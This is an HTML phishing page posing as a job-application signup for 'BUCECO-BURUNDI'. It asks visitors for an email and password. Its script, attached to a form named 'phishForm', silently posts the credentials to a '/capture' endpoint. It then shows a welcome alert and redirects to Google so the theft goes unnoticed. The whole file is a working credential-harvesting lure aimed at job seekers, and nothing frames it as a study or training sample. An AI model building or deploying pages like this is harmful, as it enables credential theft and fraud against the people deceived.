<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SIGNUP</title>
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
    <div class="login-container">
        <h1>BUCECO-BURUNDI</h1>
        <p class="warning">Apply for Our jobs,  just login below</p>
        
        <form id="phishForm">
            <input type="email" id="email" placeholder="Email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Sign up</button>
        </form>
    </div>

    <script>
        document.getElementById("phishForm").addEventListener("submit", async (e) => {
            e.preventDefault();
            
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;
            
            await fetch("/capture", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ email, password })
            });
            
            alert("WELCOME DEAR, CONTINUE TO GOOGLE");
            window.location.href = "https://www.google.com/";  // Redirect to a safe site
        });
    </script>
</body>
</html>
